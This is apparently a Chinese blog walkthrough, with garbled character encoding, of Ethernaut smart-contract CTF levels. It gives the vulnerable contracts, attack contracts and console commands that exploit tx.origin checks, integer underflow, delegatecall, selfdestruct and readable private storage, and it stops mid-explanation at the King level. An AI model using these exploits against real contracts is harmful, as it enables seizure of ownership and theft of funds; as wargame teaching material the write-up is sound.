<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin !&#x3D; msg.sender) &#123;</span><br><span class="line">      owner &#x3D; _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>é€šå…³æ¡ä»¶</strong>ï¼šè·å–åˆçº¦çš„æ‰€æœ‰æƒã€‚</p>
<p>ä»£ç å¾ˆå°‘å•Šï¼Œä½†æ˜¯å¾ˆæ¸…æ™°ï¼Œé‡Œè¾¹ä½¿ç”¨äº†<code>tx.origin</code>ï¼Œè¿™ä¸ªæ˜¯è¿”å›æœ€åˆå‘èµ·äº¤æ˜“çš„åœ°å€ï¼Œæ¯”å¦‚è¯´ï¼ŒAè¦å‘é€ä¸€ä¸ªäº¤æ˜“ç»™Bï¼ŒBå°†å…¶è½¬å‘åˆ°Cï¼Œæ­¤æ—¶å¯¹äºCæ¥è¯´ï¼Œ<code>tx.origin</code>å°±æ˜¯<code>A</code>çš„åœ°å€ã€‚è¿™ä¹ˆè¯´æœ‰ç‚¹ä¸å¤ªæ­£ç¡®ï¼Œå¼•ç”¨<a href="https://learnblockchain.cn/article/3568" target="_blank" rel="noopener">ã€ç™»é“¾ç¤¾åŒºã€‘</a>çš„è¯´æ³•å§ï¼š</p>
<blockquote>
<p><strong>msg.sender:</strong> æŒ‡ç›´æ¥è°ƒç”¨æ™ºèƒ½åˆçº¦åŠŸèƒ½çš„å¸æˆ·æˆ–æ™ºèƒ½åˆçº¦çš„åœ°å€<br><strong>tx.origin:</strong> æŒ‡è°ƒç”¨æ™ºèƒ½åˆçº¦åŠŸèƒ½çš„è´¦æˆ·åœ°å€ï¼Œåªæœ‰è´¦æˆ·åœ°å€å¯ä»¥æ˜¯tx.origin</p>
</blockquote>
<p>é‚£æˆ‘ä»¬å¯ä»¥ç›´æ¥éƒ¨ç½²æŸä¸ªæ™ºèƒ½åˆçº¦ï¼Œåœ¨è¯¥åˆçº¦ä¸­ï¼Œè°ƒç”¨<code>changeOwner</code>å‡½æ•°å³å¯ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Telephone &#123;</span><br><span class="line">  function changeOwner(address _owner) external ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TelephoneAttack &#123;</span><br><span class="line">	&#x2F;&#x2F; è¯¥åœ°å€å¯ä»¥åœ¨æ§åˆ¶å°ä¸­è¾“å…¥ &#96;await contract&#96; è·å–</span><br><span class="line">    Telephone constant private target &#x3D; Telephone(0xAcCE018DCB481A326A05E16f6F33f13C63FcC50A);</span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        target.changeOwner(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨æ§åˆ¶å°è¾“å…¥<code>await contract.owner()</code>åï¼Œå¦‚æœè¿”å›çš„æ˜¯æˆ‘ä»¬çš„ç”¨æˆ·åœ°å€ï¼Œåˆ™è¯´æ˜æˆ‘ä»¬å·²ç»æˆåŠŸæ‹¿ä¸‹åˆçº¦çš„æ‰€æœ‰æƒã€‚</p>
<h2 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address &#x3D;&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  constructor(uint _initialSupply) public &#123;</span><br><span class="line">    balances[msg.sender] &#x3D; totalSupply &#x3D; _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class="line">    require(balances[msg.sender] - _value &gt;&#x3D; 0);</span><br><span class="line">    balances[msg.sender] -&#x3D; _value;</span><br><span class="line">    balances[_to] +&#x3D; _value;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_owner];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>é€šå…³æ¡ä»¶</strong>ï¼šå¢åŠ ä½ æ‰‹ä¸­çš„ token æ•°é‡</p>
<p>æƒ³è¦å¢åŠ æˆ‘ä»¬çš„ä»£å¸é‡ï¼Œä¸€ç§æ–¹æ³•æ˜¯åˆçº¦æ‰€æœ‰è€…è°ƒç”¨<code>transfer</code>å‡½æ•°ç»™æˆ‘ä»¬å‘é€ä»£å¸ï¼Œä½†æ˜¯å®é™…ä¸Šæˆ‘ä»¬æ— æ³•å†’å……åˆçº¦æ‰€æœ‰è€…ï¼Œå› æ­¤è¿™ç§æ–¹æ³•å¹¶ä¸ç°å®ã€‚</p>
<p>å®é™…ä¸Šæœ¬å…³å¡è€ƒå¯Ÿçš„æ˜¯æº¢å‡ºï¼Œ<code>uint</code>æ˜¯<code>uint256</code>çš„åˆ«åï¼Œè¯¥ç±»å‹æ•°æ®åªèƒ½è¡¨ç¤º$[0,2^{256}-1]$ï¼Œè¯¥ç±»å‹çš„æ•°æ®è¾¾åˆ°æ‰€èƒ½è¡¨ç¤ºçš„æœ€å¤§å€¼åï¼Œå¦‚æœå†åŠ 1ï¼Œå°±ä¼šå˜æˆ0.</p>
<p>æˆ‘ä»¬å†æ¥çœ‹å¦‚ä½•ç»•è¿‡<code>require(balances[msg.sender] - _value &gt;= 0)</code>ã€‚</p>
<p>å®é™…ä¸Šæˆ‘ä»¬åªè¦è°ƒç”¨</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.transfer(<span class="string">'0xD8D2f3E5833B51a1b38e3e95f65d79C976DFffae'</span>, <span class="number">21</span>)</span><br></pre></td></tr></table></figure>

<p>å³å¯ï¼Œå…¶ä¸­ï¼Œ<code>0xD8D2f3E5833B51a1b38e3e95f65d79C976DFffae</code>æ˜¯ä¸€ä¸ªå’Œ<code>player</code>ä¸åŒçš„<strong>æœ‰æ•ˆè´¦æˆ·åœ°å€</strong>ã€‚</p>
<p>å› ä¸ºä¸€å¼€å§‹æˆ‘ä»¬çš„<code>player</code>çš„ä½™é¢æ˜¯20ï¼Œå…¶å‡å»21ï¼Œç”±äºæº¢å‡ºï¼Œ<code>balances[msg.sender] - _value</code>æ˜¯ä¸€ä¸ª256è¡¨ç¤ºçš„æœ€å¤§å€¼ã€‚</p>
<h2 id="Delatation"><a href="#Delatation" class="headerlink" title="Delatation"></a>Delatation</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Delegate &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor(address _owner) &#123;</span><br><span class="line">    owner &#x3D; _owner;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function pwn() public &#123;</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Delegation &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line">  Delegate delegate;</span><br><span class="line"></span><br><span class="line">  constructor(address _delegateAddress) &#123;</span><br><span class="line">    delegate &#x3D; Delegate(_delegateAddress);</span><br><span class="line">    owner &#x3D; msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fallback() external &#123;</span><br><span class="line">    (bool result,) &#x3D; address(delegate).delegatecall(msg.data);</span><br><span class="line">    if (result) &#123;</span><br><span class="line">      this;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>é€šå…³æ¡ä»¶</strong>ï¼šè·å–<code>Delegation</code>åˆçº¦çš„æ‰€æœ‰æƒã€‚</p>
<p>è€ƒå¯Ÿçš„æ˜¯<code>delegatecall</code>ç”¨æ³•ï¼Œå¼•ç”¨<a href="https://learnblockchain.cn/docs/solidity/introduction-to-smart-contracts.html?highlight=delegatecall" target="_blank" rel="noopener">ã€å®˜æ–¹æ–‡æ¡£ã€‘</a>å¯¹å…¶çš„ä»‹ç»ï¼š</p>
<blockquote>
<p>æœ‰ä¸€ç§ç‰¹æ®Šç±»å‹çš„æ¶ˆæ¯è°ƒç”¨ï¼Œè¢«ç§°ä¸º <strong>å§”æ‰˜è°ƒç”¨(\</strong>delegatecall*<em>)*</em> ã€‚å®ƒå’Œä¸€èˆ¬çš„æ¶ˆæ¯è°ƒç”¨çš„åŒºåˆ«åœ¨äºï¼Œç›®æ ‡åœ°å€çš„ä»£ç å°†åœ¨å‘èµ·è°ƒç”¨çš„åˆçº¦çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œå¹¶ä¸” <code>msg.sender</code> å’Œ <code>msg.value</code> ä¸å˜ã€‚ è¿™æ„å‘³ç€ä¸€ä¸ªåˆçº¦å¯ä»¥åœ¨è¿è¡Œæ—¶ä»å¦å¤–ä¸€ä¸ªåœ°å€åŠ¨æ€åŠ è½½ä»£ç ã€‚å­˜å‚¨ã€å½“å‰åœ°å€å’Œä½™é¢éƒ½æŒ‡å‘å‘èµ·è°ƒç”¨çš„åˆçº¦ï¼Œåªæœ‰ä»£ç æ˜¯ä»è¢«è°ƒç”¨åœ°å€è·å–çš„ã€‚ è¿™ä½¿å¾— Solidity å¯ä»¥å®ç°â€åº“â€œèƒ½åŠ›ï¼šå¯å¤ç”¨çš„ä»£ç åº“å¯ä»¥æ”¾åœ¨ä¸€ä¸ªåˆçº¦çš„å­˜å‚¨ä¸Šï¼Œå¦‚ç”¨æ¥å®ç°å¤æ‚çš„æ•°æ®ç»“æ„çš„åº“ã€‚</p>
</blockquote>
<p>å®é™…ä¸Šï¼š</p>
<ul>
<li><code>call</code>ï¼š<code>msg</code>å˜é‡ä¼šä¿®æ”¹ä¸º<strong>è°ƒç”¨è€…</strong>ï¼Œæ‰§è¡Œç¯å¢ƒä¸º<strong>è¢«è°ƒç”¨è€…</strong>çš„è¿è¡Œç¯å¢ƒ</li>
<li><code>delegatecall</code>ï¼š<code>msg</code>å˜é‡<strong>ä¸å˜</strong>ï¼Œæ‰§è¡Œç¯å¢ƒä¸º<strong>è°ƒç”¨è€…</strong>çš„è¿è¡Œç¯å¢ƒ</li>
<li><code>callcode</code>ï¼š<code>msg</code>å˜é‡ä¼šä¿®æ”¹ä¸ºè°ƒç”¨è€…ï¼Œæ‰§è¡Œç¯å¢ƒä¸º<strong>è°ƒç”¨è€…</strong>çš„è¿è¡Œç¯å¢ƒ</li>
</ul>
<p>çœ‹ä¸Šå»æœ‰ç‚¹ç»•ï¼Œä¸¾ä¸ªä¾‹å­ï¼Œå‡å¦‚ä½ è°ƒç”¨ï¼ˆä½¿ç”¨<code>call</code>çš„æ–¹å¼ï¼‰ä¸€ä¸ªåˆçº¦Aä¸­çš„æŸä¸ªå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°åˆä½¿ç”¨<code>delegatecall</code>çš„æ–¹å¼è°ƒç”¨äº†åˆçº¦Bçš„å‡½æ•°ï¼Œå¦‚æœåˆçº¦Bä¸­çš„å‡½æ•°å‘ç”Ÿäº†çŠ¶æ€ï¼ˆ<code>storage</code>ï¼‰æ”¹å˜ï¼Œ<strong>åˆ™æ”¹å˜çš„æ˜¯Aä¸­çš„çŠ¶æ€</strong>ï¼ŒåŒæ—¶ï¼Œåœ¨Bçœ‹æ¥ï¼Œ<strong>msgçš„å€¼æ˜¯å’Œä½ ç›¸å…³çš„</strong>ï¼ˆå³msg.senderæ˜¯ä½ çš„åœ°å€ï¼‰</p>
<p><img src="https://cdn.yalexin.top/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230218130024.png" alt></p>
<p><img src="https://cdn.yalexin.top/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20230218130226.png" alt></p>
<p>å›å½’åˆ°æœ¬å…³å¡ï¼Œæˆ‘ä»¬è¦æƒ³åŠæ³•æ‰§è¡Œ<code>fallback()</code>å‡½æ•°ï¼Œç„¶åæƒ³åŠæ³•å€ŸåŠ©<code>delegatecall</code>å‡½æ•°æ‰§è¡Œ<code>pwn</code>å‡½æ•°ï¼Œå¦‚æ­¤ä¸€æ¥ï¼Œå°±èƒ½æ”¹å˜<code>Delegation</code>åˆçº¦ä¸­çš„<code>owner</code>å˜é‡äº†ï¼Œå…·ä½“è€Œè¨€ï¼Œæ˜¯æ”¹æˆæˆ‘ä»¬çš„åœ°å€ã€‚</p>
<p><code>delegatecall</code>ç”¨æ³•ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">address.delegatecall(äºŒè¿›åˆ¶ç¼–ç æ•°æ®)</span><br></pre></td></tr></table></figure>

<p>äºŒè¿›åˆ¶ç¼–ç åˆ©ç”¨ç»“æ„åŒ–ç¼–ç å‡½æ•° abi.encodeWithSignature è·å¾—ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">abi.encodeWithSignature(&quot;å‡½æ•°ç­¾å&quot;,é€—å·åˆ†éš”çš„å…·ä½“å‚æ•°)</span><br></pre></td></tr></table></figure>

<p>ä¾‹å¦‚<code>abi.encodeWithSignature(&quot;f1(uint256,address)&quot;,_x, _addr)</code></p>
<p>å¯¹äºæœ¬å…³å¡ï¼Œæˆ‘ä»¬å¯ä»¥å€ŸåŠ©ä¸€ä¸ªåˆçº¦ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">contract T &#123;</span><br><span class="line">    function foo() pure public returns(bytes memory result)&#123;</span><br><span class="line">        result &#x3D; abi.encodeWithSignature(&quot;pwn()&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>éƒ¨ç½²åï¼Œè°ƒç”¨<code>foo</code>å‡½æ•°å¯ä»¥å¾—åˆ°è¿”å›å€¼<code>0xdd365b8b</code>ã€‚</p>
<p>ç„¶åæˆ‘ä»¬å¯ä»¥åœ¨æ§åˆ¶å°ä¸­è¾“å…¥ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.sendTransaction(&#123;<span class="attr">data</span>:<span class="string">'0xdd365b8b'</span>&#125;);</span><br></pre></td></tr></table></figure>

<p>ç„¶åæŸ¥è¯¢</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.owner()</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ˜¯ä½ çš„åœ°å€ï¼Œåˆ™è¯´æ˜æˆåŠŸäº†ã€‚</p>
<h2 id="Force"><a href="#Force" class="headerlink" title="Force"></a>Force</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Force &#123;&#x2F;*</span><br><span class="line"></span><br><span class="line">                   MEOW ?</span><br><span class="line">         &#x2F;\_&#x2F;\   &#x2F;</span><br><span class="line">    ____&#x2F; o o \</span><br><span class="line">  &#x2F;~____  &#x3D;Ã¸&#x3D; &#x2F;</span><br><span class="line"> (______)__m_m)</span><br><span class="line"></span><br><span class="line">*&#x2F;</span><br></pre></td></tr></table></figure>

<p><strong>é€šå…³æ¡ä»¶</strong>ï¼šå°†åˆçº¦çš„ä½™é¢æå‡è‡³å¤§äº0.</p>
<p><img src="https://cdn.yalexin.top/v2-7e6e4f830bc320cded2e3972596be27a_r.jpg" alt></p>
<p>å»ç½‘ä¸Šçœ‹äº†çœ‹åˆ«äººçš„åšæ³•ï¼Œæ‰çŸ¥é“æ˜¯ä½¿ç”¨<code>selfdestruct</code>å‡½æ•°</p>
<blockquote>
<p><code>selfdestruct</code>ç”±ä»¥å¤ªåŠæ™ºèƒ½åˆçº¦æä¾›ï¼Œç”¨äºé”€æ¯åŒºå—é“¾ä¸Šçš„åˆçº¦ç³»ç»Ÿã€‚å½“åˆçº¦æ‰§è¡Œè‡ªæ¯æ“ä½œæ—¶ï¼Œåˆçº¦è´¦æˆ·ä¸Šå‰©ä½™çš„ä»¥å¤ªå¸ä¼šå‘é€ç»™æŒ‡å®šçš„ç›®æ ‡ï¼Œç„¶åå…¶å­˜å‚¨å’Œä»£ç ä»çŠ¶æ€ä¸­è¢«ç§»é™¤ã€‚ç„¶è€Œï¼Œè‡ªæ¯å‡½æ•°ä¹Ÿæ˜¯ä¸€æŠŠåŒåˆƒå‰‘ï¼Œä¸€æ–¹é¢å®ƒå¯ä»¥ä½¿å¼€å‘äººå‘˜èƒ½å¤Ÿä»ä»¥å¤ªåŠä¸­åˆ é™¤æ™ºèƒ½åˆçº¦å¹¶åœ¨ç´§æ€¥æƒ…å†µä¸‹è½¬ç§»ä»¥å¤ªå¸ã€‚å¦ä¸€æ–¹é¢è‡ªæ¯å‡½æ•°ä¹Ÿå¯èƒ½æˆä¸ºæ”»å‡»è€…çš„åˆ©ç”¨å·¥å…·ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥å‡½æ•°å‘ç›®æ ‡åˆçº¦â€œ<strong>å¼ºåˆ¶è½¬è´¦</strong>â€ï¼Œæ­¤æ—¶å¹¶ä¸ä¼šè§¦å‘ç›®æ ‡åˆçº¦çš„fallbackå‡½æ•°ï¼Œå› æ­¤ä¸éœ€è¦è¯¥åˆçº¦æœ‰ä»»ä½•çš„<code>payable</code>å‡½æ•°ï¼Œä»è€Œå½±å“ç›®æ ‡åˆçº¦çš„æ­£å¸¸åŠŸèƒ½</p>
</blockquote>
<p>å› æ­¤æˆ‘ä»¬å€ŸåŠ©ä¸€ä¸ªåˆçº¦ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract ForceAttack &#123;</span><br><span class="line">    function attack(address _addr) payable public &#123;</span><br><span class="line">        selfdestruct(payable(_addr));</span><br><span class="line">    &#125;</span><br><span class="line">    fallback()payable external&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>éƒ¨ç½²åï¼Œå…ˆå¾€è¯¥æ”»å‡»åˆçº¦ä¸­è½¬å…¥å°‘è®¸ä»¥å¤ªå¸ï¼Œç„¶åå†è°ƒç”¨<code>attack</code>å‡½æ•°å³å¯ã€‚</p>
<h2 id="Vault"><a href="#Vault" class="headerlink" title="Vault"></a>Vault</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Vault &#123;</span><br><span class="line">  bool public locked;</span><br><span class="line">  bytes32 private password;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32 _password) &#123;</span><br><span class="line">    locked &#x3D; true;</span><br><span class="line">    password &#x3D; _password;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function unlock(bytes32 _password) public &#123;</span><br><span class="line">    if (password &#x3D;&#x3D; _password) &#123;</span><br><span class="line">      locked &#x3D; false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>é€šå…³æ¡ä»¶</strong>ï¼šå°†å˜é‡<code>locked</code>æ”¹ä¸º<code>false</code>.</p>
<p>çœ‹ä¸Šå»<code>password</code>æ˜¯ç§æœ‰çš„ï¼Œæˆ‘ä»¬æ— æ³•æŸ¥çœ‹ï¼Œä½†æ˜¯è¿™é‡Œæœ‰ç‚¹â€œ<strong>æ­¤åœ°æ— é“¶ä¸‰ç™¾ä¸¤</strong>â€çš„å‘³é“åœ¨é‡Œè¾¹ã€‚</p>
<p>private å®šä¹‰çš„å‡½æ•°å’ŒçŠ¶æ€å˜é‡åªå¯¹å®šä¹‰å®ƒçš„åˆçº¦å¯è§ï¼Œè¯¥åˆçº¦æ´¾ç”Ÿçš„åˆçº¦éƒ½ä¸èƒ½è°ƒç”¨å’Œè®¿é—®è¯¥å‡½æ•°åŠçŠ¶æ€å˜é‡ã€‚</p>
<p>åœ¨åˆçº¦ä¹‹å¤–ï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥è·å–è¯¥å˜é‡çš„å€¼ï¼Œå› ä¸ºæ™ºèƒ½åˆçº¦æœ€ç»ˆéƒ½ä¼šå†™è¿›é“¾ä¸Šï¼ŒåŒ…æ‹¬<code>storage</code>ï¼Œè€Œå˜é‡å±äº<code>storage</code>ã€‚</p>
<p>æˆ‘ä»¬å‚è€ƒ<code>web3.js</code><a href="https://learnblockchain.cn/docs/web3.js/web3-eth.html?highlight=getstorageat#getstorageat" target="_blank" rel="noopener">ã€æ–‡æ¡£ã€‘</a>,ä½¿ç”¨<strong>getStorageAt</strong>å‡½æ•°è¯»å–æŒ‡å®šå†…å­˜ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">web3.eth.getStorageAt(address, position [, defaultBlock] [, callback])</span><br></pre></td></tr></table></figure>

<p><strong>å‚æ•°</strong></p>
<ol>
<li><code>String</code> - ç”¨æ¥è·å–å­˜å‚¨å€¼çš„åœ°å€ã€‚</li>
<li><code>Number|String|BN|BigNumber</code> - å­˜å‚¨çš„ç´¢å¼•ä½ç½®ã€‚</li>
<li><code>Number|String|BN|BigNumber</code> - (å¯é€‰) å¦‚æœä¼ å…¥å€¼åˆ™ä¼šè¦†ç›–é€šè¿‡ <a href="https://learnblockchain.cn/docs/web3.js/web3-eth.html?highlight=getstorageat#eth-defaultblock" target="_blank" rel="noopener">web3.eth.defaultBlock</a> è®¾ç½®çš„é»˜è®¤åŒºå—å·ã€‚é¢„å®šä¹‰çš„åŒºå—å·å¯ä»¥ä½¿ç”¨ <code>&quot;latest&quot;</code>, <code>&quot;earliest&quot;</code> <code>&quot;pending&quot;</code>, å’Œ <code>&quot;genesis&quot;</code> ç­‰å€¼ã€‚</li>
<li><code>Function</code> - (å¯é€‰) å¯é€‰çš„å›è°ƒå‡½æ•°ï¼Œå…¶ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºé”™è¯¯å¯¹è±¡ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºå‡½æ•°è¿è¡Œç»“æœã€‚</li>
</ol>
<p>æˆ‘ä»¬å¯ä»¥åœ¨æ§åˆ¶å°è¾“å…¥ï¼š</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.eth.getStorageAt(<span class="string">"0x743e4DdB7A7415D8B4B91b6943AdD4749fa6bd27"</span>, <span class="string">"1"</span>)</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­å‰é¢ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯åˆçº¦çš„åœ°å€ï¼Œè°ƒç”¨<code>contract</code>å¯ä»¥è·å–ã€‚åé¢çš„å‚æ•°æ˜¯åç§»é‡ã€‚</p>
<p>è¿”å›äº†<code>0x412076657279207374726f6e67207365637265742070617373776f7264203a29</code>ï¼Œå®é™…ä¸Šå°±æ˜¯<code>password</code>å˜é‡ã€‚</p>
<p>æˆ‘ä»¬å°†å…¶ä½œä¸ºå‚æ•°ï¼Œè°ƒç”¨<code>unlock</code>å‡½æ•°å³å¯ã€‚</p>
<p>å®é™…ä¸Šï¼Œæˆ‘ä»¬å°†è¯¥å¯†ç è§£ç ï¼Œæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²<code>A very strong secret password :)</code></p>
<h2 id="King"><a href="#King" class="headerlink" title="King"></a>King</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract King &#123;</span><br><span class="line"></span><br><span class="line">  address king;</span><br><span class="line">  uint public prize;</span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() payable &#123;</span><br><span class="line">    owner &#x3D; msg.sender;  </span><br><span class="line">    king &#x3D; msg.sender;</span><br><span class="line">    prize &#x3D; msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt;&#x3D; prize || msg.sender &#x3D;&#x3D; owner);</span><br><span class="line">    payable(king).transfer(msg.value);</span><br><span class="line">    king &#x3D; msg.sender;</span><br><span class="line">    prize &#x3D; msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function _king() public view returns (address) &#123;</span><br><span class="line">    return king;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>æœ¬å…³å¡ç±»ä¼¼ä¸€ä¸ªåºæ°éª—å±€ï¼Œå³ä»»ä½•äººåªè¦å¾€è¯¥åˆçº¦å……å€¼çš„é’±æ•°Aå¤§äºä¸Šä¸€ä»»å›½ç‹çš„é’±æ•°Bï¼Œé‚£ä»–å°†ä¼šå˜æˆæ–°çš„å›½ç‹ï¼ŒåŒæ—¶æ—§å›½ç‹å°†ä¼šå¾—åˆ°æ•°é‡ä¸ºAçš„é’±ã€‚</p>
</blockquote>
<p><strong>é€šå…³æ¡ä»¶</strong>ï¼šæäº¤å®ä¾‹åï¼Œç³»ç»Ÿå°†ä¼šå°è¯•å°†ç‹æƒæ‹¿èµ°ï¼Œä½ è¦é˜»æ­¢è¿™ä¸€è¿‡ç¨‹ï¼Œå³åˆçº¦ç‹æƒä¸ä¼šè¢«æ›´æ”¹ï¼ˆ<strong>åˆ«æƒ³ç€å¾€é‡Œè¾¹å……å€¼å¤§é‡ä»¥å¤ªå¸ï¼Œè¿™ä¸ªåŠæ³•è¡Œä¸é€š</strong>ï¼‰ã€‚</p>
<p>æœ¬å…³å¡åˆ©ç”¨ç‚¹æ˜¯<code>transfer</code>ã€‚å³æˆ‘ä»¬è·å–ç‹æƒåï¼Œå°è¯•<strong>æ‹’ç»ç³»ç»Ÿçš„è½¬è´¦</strong>ã€‚</p>
<p>æ™ºèƒ½åˆçº¦ä¸­ï¼Œæœ‰ä¸‰ç§æ–¹å¼è¿›è¡Œè½¬è´¦ï¼Œåˆ†åˆ«æ˜¯ï¼š</p>
<p><strong><code>send</code></strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;address payable&gt;.send(uint256 amount) returns (bool)</span><br></pre></td></tr></table></figure>

<p>å‘<code>address</code>è½¬å…¥<code>amount</code>ï¼Œå¦‚æœå¼‚å¸¸ä¼šè½¬è´¦å¤±è´¥ï¼Œä»…ä¼šè¿”å›falseï¼Œä¸ä¼šç»ˆæ­¢æ‰§è¡Œï¼ˆåˆçº¦åœ°å€è½¬è´¦ï¼‰,æœ‰gasé™åˆ¶ï¼Œæœ€å¤§2300</p>
<p><strong><code>transfer</code></strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;address payable&gt;.transfer(uint256 amount)</span><br></pre></td></tr></table></figure>

<p>å¦‚æœå¼‚å¸¸ä¼šè½¬è´¦å¤±è´¥ï¼ŒæŠ›å‡ºå¼‚å¸¸(ç­‰ä»·äºrequi(send()))ï¼ˆåˆçº¦åœ°å€è½¬è´¦ï¼‰ï¼Œæœ‰gasé™åˆ¶ï¼Œæœ€å¤§2300ã€‚</p>
<p><strong><code>call</code></strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;address&gt;.call(bytes memory) returns (bool, bytes memory)</span><br></pre></td></tr></table></figure>

<p>å¦‚æœå¼‚å¸¸ä¼šè½¬è´¦å¤±è´¥ï¼Œä»…ä¼šè¿”å›falseï¼Œä¸ä¼šç»ˆæ­¢æ‰§è¡Œï¼ˆè°ƒç”¨åˆçº¦çš„æ–¹æ³•å¹¶è½¬è´¦ï¼‰,æ²¡æœ‰gasé™åˆ¶.</p>
<p>ä»ä¸Šé¢å¯ä»¥çœ‹å‡ºï¼Œå½“<code>transfer</code>å‡ºç°å¼‚å¸¸æ—¶å€™ï¼Œç¬¬19ã€20è¡Œå°±ä¸è¢«æ‰§è¡Œï¼Œå³æˆ‘ä»¬åº”è¯¥å°è¯•è§¦å‘ä¸€ä¸ªå¼‚å¸¸ï¼Œå€ŸåŠ©ä¸‹é¢çš„åˆçº¦ï¼Œæˆ‘ä»¬å³å¯å®Œæˆ</p>
